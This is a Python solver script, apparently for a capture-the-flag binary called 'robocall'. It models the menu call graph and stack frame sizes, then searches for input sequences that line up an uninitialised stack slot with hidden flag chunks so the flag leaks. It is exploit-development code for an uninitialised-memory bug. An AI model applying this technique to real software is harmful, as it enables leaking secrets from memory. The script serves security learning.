"""Find menu-navigation paths that put cancel_plan's uninitialised int slot
(rbp_cancel_plan - 0x204) exactly on top of a scattered flag chunk.

rbp_callee = rbp_caller - (caller_frame + 16)
place_flag chunk i sits at  rbp_main - (0x120 + 0x644 + CHUNK_DEPTH[i])
cancel_plan slot  sits at   rbp_main - (depth(cancel_plan) + 0x204)
"""
import sys, struct
from collections import deque
sys.stdout.reconfigure(encoding="utf-8", errors="replace")

FRAME = {
    "main": 0x110, "start_position": 0x110, "initial_call": 0x170, "initial_email": 0x0,
    "start_service": 0x1c0, "report_outage": 0x150, "billing_department": 0x180,
    "technical_support": 0x160, "upgrade_or_change": 0x190, "other_inquiries": 0x190,
    "cancel_plan": 0x430, "payment_info": 0x100, "login_roleplay": 0x100,
    "speak_with_an_operator": 0x70,
}
E = [
    ("main", "", "start_position"),
    ("start_position", "1", "initial_call"),
    ("start_position", "2", "initial_email"),
    ("start_position", "3", "start_position"),          # scream, then recurse
    ("initial_call", "1", "start_service"),
    ("initial_call", "2", "report_outage"),
    ("initial_call", "3", "billing_department"),
    ("initial_call", "4", "technical_support"),
    ("initial_call", "5", "upgrade_or_change"),
    ("initial_call", "6", "other_inquiries"),
    ("start_service", "", "payment_info"),
    ("report_outage", "", "start_position"),
    ("billing_department", "1", "payment_info"),
    ("billing_department", "2", "payment_info"),
    ("billing_department", "0", "billing_department"),  # any other value -> recurse
    ("technical_support", "1", "report_outage"),
    ("technical_support", "2", "login_roleplay"),
    ("technical_support", "0", "technical_support"),    # other -> recurse
    ("upgrade_or_change", "1", "start_position"),
    ("upgrade_or_change", "2", "start_service"),
    ("upgrade_or_change", "0", "upgrade_or_change"),    # other -> recurse
    ("other_inquiries", "2", "cancel_plan"),
    ("other_inquiries", "3", "speak_with_an_operator"),
    ("cancel_plan", "0", "speak_with_an_operator"),
    ("cancel_plan", "1", "upgrade_or_change"),
    ("cancel_plan", "2", "report_outage"),
    ("cancel_plan", "3", "technical_support"),
    ("cancel_plan", "4", "cancel_plan"),                # fun fact then recurse
    ("cancel_plan", "5", "start_position"),
    ("speak_with_an_operator", "", "start_position"),
]
ADJ = {}
for a, c, b in E:
    ADJ.setdefault(a, set()).add((c, b))

d = open('files/robocall', 'rb').read()
DEPTH = struct.unpack_from('<13I', d, 0x4020)
CHUNK = [0x120 + 0x644 + v for v in DEPTH]
SLOT = 0x204
MAXD, MAXSTEPS = 0x2400, 26

q = deque([("main", 0, [])])
seen = {("main", 0)}
best = {}
while q:
    fn, depth, path = q.popleft()
    if fn == "cancel_plan":
        slot = depth + SLOT
        for i, ch in enumerate(CHUNK):
            if slot == ch and i not in best:
                best[i] = path
    if depth > MAXD or len(path) > MAXSTEPS:
        continue
    for choice, callee in sorted(ADJ.get(fn, [])):
        nd = depth + FRAME[fn] + 16
        if nd > MAXD or (callee, nd) in seen:
            continue
        seen.add((callee, nd))
        q.append((callee, nd, path + [(fn, choice, callee)]))

print("chunk depths below rbp_main:", [hex(c) for c in CHUNK])
print()
for i, ch in enumerate(CHUNK):
    if i in best:
        seq = " ".join(c for _, c, _ in best[i] if c)
        print(f"chunk[{i:2d}] @ -0x{ch:04x}: choices = {seq}")
    else:
        print(f"chunk[{i:2d}] @ -0x{ch:04x}: NOT REACHED")
print(f"\n{len(best)}/13 chunks reachable")
